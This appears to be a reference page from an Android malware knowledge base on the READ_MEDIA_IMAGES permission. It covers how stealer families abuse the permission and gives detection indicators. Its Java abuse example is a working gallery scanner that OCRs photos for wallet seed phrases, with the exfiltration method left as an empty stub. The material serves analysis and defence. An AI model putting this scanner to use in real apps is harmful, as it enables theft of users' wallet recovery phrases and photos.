# READ_MEDIA_IMAGES

Allows reading image files (photos, screenshots) from shared storage via `MediaStore`. Introduced in Android 13 as a granular replacement for `READ_EXTERNAL_STORAGE`, giving users control over which media types an app can access.

## Technical Details

| Attribute | Value |
|-----------|-------|
| Permission | `android.permission.READ_MEDIA_IMAGES` |
| Protection Level | `dangerous` |
| Permission Group | `READ_MEDIA_VISUAL` (Android 14+) |
| Grant Method | Runtime permission dialog |
| Introduced | API 33 (Android 13) |

## What It Enables

Query `MediaStore.Images` for all photos and screenshots on the device. Includes EXIF metadata (GPS coordinates, camera model, timestamps).

## Abuse in Malware

### Photo Exfiltration

Steal personal photos for blackmail, identity theft, or intelligence gathering. Screenshots may contain sensitive information (banking app screens, private messages, authentication codes).

### EXIF Location Data

Photos contain GPS coordinates in EXIF metadata, revealing where and when they were taken, even without location permission.

### Document Theft via Screenshots

Users often screenshot sensitive documents, banking details, and passwords. These are accessible through this permission.

### Notable Families

| Family | Usage |
|--------|-------|
| [SparkCat](../../malware/families/sparkcat.md) | Uses Google ML Kit OCR to scan gallery photos for cryptocurrency wallet seed phrases |
| [SpyAgent](../../malware/families/spyagent.md) | OCR-based scanning of device photos for crypto mnemonic seed phrases targeting Korean users |
| [SpyLoan](../../malware/families/spyloan.md) | Exfiltrates personal photos for blackmail and extortion of loan defaulters |

SparkCat and SpyAgent represent an emerging threat pattern: on-device OCR to extract cryptocurrency recovery phrases from screenshots. Both families scan the gallery using `MediaStore.Images`, process each image through text recognition, and selectively exfiltrate images matching BIP-39 seed phrase patterns. SpyLoan takes a different approach, collecting personal photos during "identity verification" and weaponizing them if borrowers default on predatory loans.

### READ_EXTERNAL_STORAGE vs Granular Permissions

SparkCat is a notable example of the permission transition in action. Its manifest declares both `READ_EXTERNAL_STORAGE` (for pre-Android 13 devices) and `READ_MEDIA_IMAGES` (for API 33+), ensuring the OCR scanning works across all Android versions. SpyLoan similarly declares both because its Play Store distribution requires targeting current API levels.

- [SparkCat](../../malware/families/sparkcat.md) declares both `READ_EXTERNAL_STORAGE` and `READ_MEDIA_IMAGES` in its manifest
- [Anubis](../../malware/families/anubis.md) uses `READ_EXTERNAL_STORAGE` for file browsing and exfiltration on older Android versions
- [Mamont](../../malware/families/mamont.md) uses `READ_EXTERNAL_STORAGE` for photo and file access
- [FireScam](../../malware/families/firescam.md) uses `READ_EXTERNAL_STORAGE` for device storage access

Families that only declare `READ_EXTERNAL_STORAGE` without `READ_MEDIA_IMAGES` will lose photo access on devices running Android 13+ if they target API 33+. However, many sideloaded malware families deliberately target API 32 or lower to avoid the granular permission split entirely.

### Abuse Code Example

```java
public class ImageScanner {

    private final ContentResolver resolver;
    private final TextRecognizer recognizer;
    private final List<String> seedWords;

    public ImageScanner(ContentResolver resolver, List<String> seedWords) {
        this.resolver = resolver;
        this.seedWords = seedWords;
        this.recognizer = TextRecognition.getClient(
            new TextRecognizerOptions.Builder().build()
        );
    }

    public void scanGalleryForSeedPhrases() {
        String[] projection = {
            MediaStore.Images.Media._ID,
            MediaStore.Images.Media.DISPLAY_NAME,
            MediaStore.Images.Media.DATE_ADDED
        };

        Cursor cursor = resolver.query(
            MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
            projection,
            null, null,
            MediaStore.Images.Media.DATE_ADDED + " DESC"
        );

        if (cursor == null) return;

        while (cursor.moveToNext()) {
            long id = cursor.getLong(0);
            Uri imageUri = ContentUris.withAppendedId(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id
            );
            processImage(imageUri);
        }
        cursor.close();
    }

    private void processImage(Uri uri) {
        try {
            Bitmap bitmap = MediaStore.Images.Media.getBitmap(resolver, uri);
            InputImage inputImage = InputImage.fromBitmap(bitmap, 0);
            recognizer.process(inputImage)
                .addOnSuccessListener(text -> {
                    String detected = text.getText().toLowerCase();
                    int matchCount = 0;
                    for (String word : seedWords) {
                        if (detected.contains(word)) matchCount++;
                    }
                    if (matchCount >= 8) {
                        exfiltrateImage(uri);
                    }
                });
        } catch (Exception e) {
        }
    }

    private void exfiltrateImage(Uri uri) {
    }
}
```

This pattern mirrors SparkCat's approach: enumerate all images, run OCR on each, match against BIP-39 wordlist patterns, and selectively exfiltrate images that contain enough seed phrase words to indicate a wallet backup screenshot.

## Android Version Changes

**Android 13 (API 33)**: introduced as replacement for `READ_EXTERNAL_STORAGE` for media access. Apps targeting API 33+ must request this specific permission for image access.

**Android 14 (API 34)**: users can grant partial access (select specific photos) instead of full access. The app may not see all images. This significantly impacts OCR-based stealers like SparkCat, as partial access limits the gallery surface available for scanning. However, malware can re-prompt the user to "select all" or use social engineering to obtain full access.

**Android 14 (API 34)**: `READ_MEDIA_IMAGES` grouped with `READ_MEDIA_VIDEO` in the `READ_MEDIA_VISUAL` permission group. Granting one grants the other.

**Pre-Android 13**: apps use `READ_EXTERNAL_STORAGE` which grants access to all file types including images, making image-specific abuse harder to distinguish.

## Detection

In the manifest:

```xml
<uses-permission android:name="android.permission.READ_MEDIA_IMAGES" />
```

### Analysis Indicators

- Google ML Kit or Tesseract OCR library bundled in an app that has no text-recognition feature in its UI is a strong indicator of SparkCat-style abuse.
- Look for `MediaStore.Images` queries combined with image processing APIs (`Bitmap`, `InputImage`, `TextRecognizer`).
- Apps that enumerate all images in the gallery without displaying them to the user are performing reconnaissance or bulk scanning.
- Check for EXIF metadata extraction -- `ExifInterface` usage combined with `INTERNET` indicates location data exfiltration.
- `ContentObserver` registration on `MediaStore.Images` for real-time monitoring of new screenshots is common in stalkerware and OCR stealers.
- On pre-Android 13 samples, `READ_EXTERNAL_STORAGE` with `MediaStore.Images` queries achieves the same result -- the broader permission masks image-specific intent.

## See Also

- [READ_EXTERNAL_STORAGE](read-external-storage.md) -- the pre-Android 13 permission that granted access to all media types including images
- [READ_MEDIA_VIDEO](read-media-video.md) -- grouped with `READ_MEDIA_IMAGES` in the `READ_MEDIA_VISUAL` permission group on Android 14+ (granting one grants the other)
- [READ_MEDIA_AUDIO](read-media-audio.md) -- companion granular permission for audio access
- [Clipboard Hijacking](../../attacks/clipboard-hijacking.md) -- related cryptocurrency theft technique that targets seed phrases copied to clipboard rather than photographed
